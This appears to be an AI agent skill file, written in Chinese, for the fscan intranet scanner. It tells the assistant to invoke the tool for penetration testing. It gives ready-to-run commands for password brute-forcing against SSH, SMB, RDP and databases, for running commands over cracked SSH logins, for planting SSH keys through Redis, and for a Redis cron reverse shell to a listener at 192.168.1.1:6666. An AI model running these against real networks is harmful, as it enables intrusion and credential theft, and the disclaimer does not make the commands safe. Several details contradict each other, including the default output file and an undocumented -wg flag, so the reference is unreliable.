---
name: "fscan"
description: "内网综合扫描工具，支持主机存活探测、端口扫描、密码爆破、漏洞检测等。Invoke when user needs to scan intranet, perform penetration testing, or use fscan command."
---

# fscan - 内网综合扫描工具

fscan 是一款内网综合扫描工具，支持一键自动化、全方位漏扫扫描。

## 安装

### 编译安装

```bash
git clone https://github.com/shadow1ng/fscan.git
cd fscan
go build -ldflags="-s -w" -trimpath main.go
```

### Arch Linux

```bash
yay -S fscan-git
# 或
paru -S fscan-fscan
```

## 基本用法

```bash
fscan -h 192.168.1.1/24    # 扫描整个C段
fscan -h 192.168.1.1       # 扫描单个主机
fscan -h 10.0.0.0/8        # 扫描整个A段
```

## 完整参数列表

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-h` | 目标主机 (IP/IP段，支持 192.168.1.1 / 192.168.1.1-255 / 192.168.1.1,192.168.1.2) | - |
| `-hf` | 主机文件 (从文件导入目标) | - |
| `-u` | 指定URL | - |
| `-uf` | URL文件 (从文件导入URL) | - |
| `-p` | 指定端口 (如 22 / 1-65535 / 22,80,3306) | 21,22,80,81,135,443,445,1433,3306,5432,6379... |
| `-m` | 扫描模块 (all/icmp/netbios/ssh/smb/rdp/mysql/mssql/redis/postgresql/oracle/ftp... | all |
| `-c` | 执行命令 (SSH爆破成功后执行) | - |
| `-cookie` | 设置POC Cookie | - |
| `-debug` | Debug模式 (打印更多错误信息) | false |
| `-domain` | SMB域 | - |
| `-no` | 不保存输出文件 | false |
| `-nopoc` | 跳过Web POC扫描 | false |
| `-np` | 跳过存活探测 | false |
| `-o` | 输出文件 | result.txt |
| `-ping` | 使用ping替代ICMP探测 | false |
| `-pocname` | 指定POC名称 (如 -pocname weblogic) | - |
| `-proxy` | 设置POC代理 (如 -proxy http://127.0.0.1:8080) | - |
| `-pwd` | 密码 | - |
| `-pwdf` | 密码字典文件 | - |
| `-rf` | Redis写公钥文件 (如 -rf id_rsa.pub) | - |
| `-rs` | Redis计划任务反弹 (如 -rs 192.168.1.1:6666) | - |
| `-t` | 线程数 | 600 |
| `-time` | 超时时间(秒) | 3 |
| `-user` | 用户名 | - |
| `-userf` | 用户名文件 | - |
| `-wt` | Web超时时间(秒) | 5 |
| `-Num` | POC速率 | 20 |
| `-pf` | 端口列表文件 | - |

## 常用示例

### 1. 基础扫描（全功能）

```bash
fscan -h 192.168.x.x
```
扫描目标并自动检测：MS17-010漏洞、读取网卡信息

### 2. Redis 写公钥

```bash
fscan -h 192.168.x.x -rf id_rsa.pub
```
利用Redis写入公钥实现远程访问

### 3. SSH 命令执行

```bash
fscan -h 192.168.x.x -c "whoami;id"
```
通过SSH执行指定命令

### 4. Web漏洞扫描（配合Xray）

```bash
fscan -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080
```
扫描80端口并使用代理配合Xray的POC进行漏洞检测

### 5. NetBIOS探测

```bash
fscan -h 192.168.x.x -p 139
```
检测NetBIOS信息，识别域控（[+]DC代表域控）

### 6. 完整NetBIOS信息

```bash
fscan -h 192.168.x.x/24 -m netbios
```

### 7. ICMP探测

```bash
fscan -h 192.0.0.0/8 -m icmp
```
探测每个C段的网关和随机IP，统计存活数量

### 8. 指定端口扫描

```bash
fscan -h 192.168.x.x -p 22,3306,3389,5432,6379,8080
```
扫描常见高危端口

### 9. 自定义密码字典

```bash
fscan -h 192.168.x.x -wg password.txt
```
使用自定义字典进行爆破

### 10. 端口列表文件

```bash
fscan -h 192.168.x.x -pf portlist.txt
```
使用自定义端口列表

### 11. 主机文件导入

```bash
fscan -hf ip.txt
```
从文件导入目标主机列表

### 12. URL文件导入

```bash
fscan -uf url.txt
```
从文件导入URL进行Web扫描

### 13. 指定单个URL扫描

```bash
fscan -u http://192.168.x.x:8080
```
针对单个URL进行Web扫描

### 14. SMB密码碰撞

```bash
fscan -h 192.168.x.x -m smb -pwd password
```
使用指定密码尝试SMB登录

### 15. 自定义用户名/密码文件

```bash
fscan -h 192.168.x.x -userf users.txt -pwdf pwd.txt
```
使用自定义用户名和密码字典进行爆破

### 16. 跳过Web POC扫描

```bash
fscan -h 192.168.x.x -nopoc
```
只进行端口扫描和爆破，不进行Web漏洞检测

### 17. 跳过存活探测

```bash
fscan -h 192.168.x.x -np
```
不进行ICMP存活探测，直接扫描

### 18. 不保存输出

```bash
fscan -h 192.168.x.x -no
```
扫描结果不保存到文件

### 19. 指定模块扫描

```bash
fscan -h 192.168.x.x -m ssh -p 2222
```
指定只使用ssh模块，并扫描2222端口

### 20. Redis计划任务反弹

```bash
fscan -h 192.168.x.x -rs 192.168.1.1:6666
```
利用Redis写入计划任务反弹Shell

### 21. 调整线程数

```bash
fscan -h 192.168.x.x -t 1000
```
增加线程数提高扫描速度（默认600）

### 22. 调整超时时间

```bash
fscan -h 192.168.x.x -time 10
```
增加超时时间到10秒

### 23. Debug模式

```bash
fscan -h 192.168.x.x -debug
```
开启Debug模式，查看更多错误信息

### 24. 指定POC扫描

```bash
fscan -h 192.168.x.x -pocname weblogic
```
只扫描包含weblogic名称的POC

### 25. A段快速探测

```bash
fscan -h 192.168.1.1/8
```
扫描A段，自动探测192.x.x.1和192.x.x.254

## 爆破服务支持

- **SSH**
- **SMB**
- **RDP**
- **MySQL**
- **MSSQL**
- **Redis**
- **PostgreSQL**
- **Oracle**
- **FTP**
- **Telnet**

## 漏洞检测

- **MS17-010** (永恒之蓝)
- **WebLogic**
- **Struts2**
- 兼容XRay POC

## Web探测功能

- 自动获取网站标题
- Web指纹识别 (CMS/OA框架)
- Web漏洞扫描

## 输出结果

所有扫描结果会自动保存到文件，默认文件名为 `fscan.txt`

## 免责声明

本工具仅面向合法授权的企业安全建设行为。使用前请确保：
1. 已取得目标系统的授权
2. 符合当地法律法规
3. 仅用于授权的安全测试

请勿对非授权目标进行扫描！
